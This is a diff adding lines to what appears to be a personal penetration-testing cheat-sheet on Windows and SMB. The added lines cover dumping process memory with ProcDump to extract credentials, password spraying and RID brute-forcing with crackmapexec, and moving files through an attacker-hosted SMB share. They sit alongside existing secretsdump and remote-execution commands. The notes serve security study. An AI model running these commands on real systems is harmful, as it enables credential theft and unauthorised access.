@@ -108,7 +108,10 @@
   
 - **ProcDump**
   - monitor cpu spikes + crash dumps
+  - extract credentials from process
   - create dump ==> also with process explorer
+  - procdump -ma PROCESS 
+  - alternative: Out-Minidump
   
 - **Process Explorer**
   - actice process + handles or dll
@@ -337,6 +340,10 @@ python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/D
 - crackmapexec smb <target-ip> -u username -p password -M spider_plus
 cat /tmp/cme_spider_plus/<target-ip>.json
 - crackmapexec smb $target -u Administrator -p 123456 -x COMMAND_TO_EXECUTE
+- crackmapexec smb $target -u users.txt -p pass.txt
+- crackmapexec smb $target -u user -p pass --rid-brute
+  - brute force SID - Security Identifier = find users
+
 - [crackmapexec](https://www.crackmapexec.wiki/)
 
 
@@ -530,9 +537,12 @@ cat /tmp/cme_spider_plus/<target-ip>.json
 - Transfer files
   - On attacking maching
     - smbserver.py share .
+    - smbserver.py -smb2support -username USER -password PASS share /path/to/share/local
   - On target
     - net use \\AttackingIP\share
-    - copy \\IP\\share\file.ext
+    - net use x: \\IP\share /user:USER PASS = send to drive X:
+    - copy \\IP\\share\file.ext = fetch file
+    - 
     - smbclient -U USER '//IP/folder'
     - put file.name
     - smbclient -c 'put pat.exe' -U USER -W ZA '//TARGET' PASSWORD
